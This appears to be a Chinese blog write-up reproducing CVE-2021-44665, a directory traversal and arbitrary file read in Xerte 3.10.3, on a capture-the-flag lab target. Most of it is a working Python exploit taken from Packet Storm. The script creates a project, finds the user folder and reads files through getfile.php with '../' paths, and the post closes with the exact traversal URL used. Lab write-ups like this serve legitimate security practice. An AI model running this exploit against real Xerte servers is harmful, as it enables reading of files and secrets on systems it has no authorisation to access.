---
title: CVE-2021-44665【目录遍历 & 任意文件读取】
author: Ghost
date: 2023-12-10
categories:
  - ['春秋云境', '漏洞靶标']
  - 漏洞复现
tags:
  - '目录遍历'
  - '任意文件读取'
---

## 1. 漏洞介绍

[阿里云漏洞库](https://avd.aliyun.com/detail?id=AVD-2021-44665)

## 2. 漏洞分析

[Xerte 3.10.3 Directory Traversal](https://packetstormsecurity.com/files/166181/Xerte-3.10.3-Directory-Traversal.html)

## 3. 漏洞复现

poc.py【来源：[Xerte 3.10.3 Directory Traversal ≈ Packet Storm](https://packetstormsecurity.com/files/166181/Xerte-3.10.3-Directory-Traversal.html)】

```python
import requests
import re

xerte_base_url = "http://eci-2zegyjtjnfxk6cokkzlw.cloudeci1.ichunqiu.com/"
file_to_grab = "/../../../../../flag"
php_session_id = "" # If guest is not enabled, and you have a session ID. Put it here.

with requests.Session() as session:
    # Get a PHP session ID
    if not php_session_id:
        session.get(xerte_base_url) 
    else:
        session.cookies.set("PHPSESSID", php_session_id)

    # Use a default template
    data = {
        'tutorialid': 'Nottingham',
        'templatename': 'Nottingham',
        'tutorialname': 'exploit',
        'folder_id': ''
    }

    # Create a new project in order to create a user-folder
    template_id = session.post(xerte_base_url + '/website_code/php/templates/new_template.php', data=data)

    # Find template ID
    data = {
        'template_id': re.findall('(\d+)', template_id.text)[0]
    }

    # Find the created user-direcotry:
    user_direcotry = session.post(xerte_base_url + '/website_code/php/properties/media_and_quota_template.php', data=data)
    user_direcotry = re.findall('USER-FILES\/([0-9]+-[a-z0-9]+-[a-zA-Z0-9_]+)', user_direcotry.text)[0]

    # Grab file
    result = session.get(xerte_base_url + '/getfile.php?file=' + user_direcotry + file_to_grab)
    print(result.text)
    print("|-- Used Variables: --|")
    print("PHP Session ID: " + session.cookies.get_dict()['PHPSESSID'])
    print("user direcotry: " + user_direcotry)
    print("Curl example:")
    print('curl --cookie "PHPSESSID=' + session.cookies.get_dict()['PHPSESSID'] + '" ' + xerte_base_url + '/getfile.php?file=' + user_direcotry + file_to_grab)
```

注，flag 的位置是慢慢测出来的

![1.jpg](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202309061744790.jpg)

`http://eci-2zegyjtjnfxk6cokkzlw.cloudeci1.ichunqiu.com//getfile.php?file=7-guest2-Nottingham/../../../../../flag`
